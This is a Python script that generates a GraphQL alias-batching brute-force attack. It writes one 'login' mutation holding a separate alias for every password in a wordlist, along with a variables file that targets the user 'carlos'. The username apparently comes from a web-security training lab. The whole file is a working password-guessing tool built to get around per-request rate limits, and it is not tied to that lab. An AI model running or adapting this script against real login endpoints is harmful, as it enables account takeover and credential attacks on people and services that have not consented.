def create_bruteforce_query(query_file, variables_file, password_file):
    
    # Count the number of passwords in password_file (aka number of lines)
    password_count = number_of_lines(password_file) 
    
    # Extract query from query_file
    # Create new query with n variable declarations, n aliases
    # n = number of passwords in password_file
    # Output query to output_file
    # Output new line to output_file 
    print(f"[INFO] Writing query to {query_file} ...")
    write_query(query_file, password_count)
    
    # Extract variables from query_file
    # Create n new variables, where each variable's 
    # password field is the nth password in password_file
    # Append variables (in graphql format) to output_file
    print(f"[INFO] Writing variables to {variables_file} ...")
    write_variables(variables_file, password_file, password_count)


def write_query(output_file, password_count):
    with open(output_file, "w") as output_f:
        output_f.write("mutation login(")
        
        for i in range(1, password_count+1):
            variable_declaration = f"$input{i}: LoginInput!"

            if i == password_count:
                output_f.write(variable_declaration)
            else:
                output_f.write(f"{variable_declaration}, ")

        output_f.write(") {")
        
        for i in range(1, password_count+1):
            alias = f"""\n\tlogin{i}:login(input: $input{i}) {{\n\t\ttoken\n\t\tsuccess\n\t}}"""
            
            output_f.write(alias)

        output_f.write("\n}")


def write_variables(output_file, password_file, password_count):
    with open(output_file, "w") as output_f:
        output_f.write("{")

        with open(password_file, "r") as password_f:
            for i, password in enumerate(password_f, start=1):

                variable = f"\n\t\"input{i}\":{{\n\t\t\"username\":\"carlos\",\n\t\t\"password\":\"{password.strip()}\"\n\t}}"
                
                if i == password_count:
                    output_f.write(variable)
                else:
                    output_f.write(f"{variable},")

        output_f.write("\n}")


def number_of_lines(file):
    
    # Count the number of lines in a file using the faster raw interface
    # Source - https://stackoverflow.com/a/27518377
    # Posted by Michael Bacon, modified by community. See post 'Timeline' for change history
    # Retrieved 2026-05-09, License - CC BY-SA 4.0
    with open(file, "rb") as f:
        number_of_lines = 0
        buffer_size = 1024 * 1024
        buffer = f.raw.read(buffer_size)
        
        while buffer:
            number_of_lines += buffer.count(b"\n")
            buffer = f.raw.read(buffer_size)
        
    return number_of_lines


def main():
    query_file = "bruteforce_query"
    variables_file = "bruteforce_variables"
    password_file = "passwords.txt"

    print("[INFO] Creating bruteforce query ... ")
    create_bruteforce_query(query_file, variables_file, password_file)
    

if __name__ == "__main__":
    main()
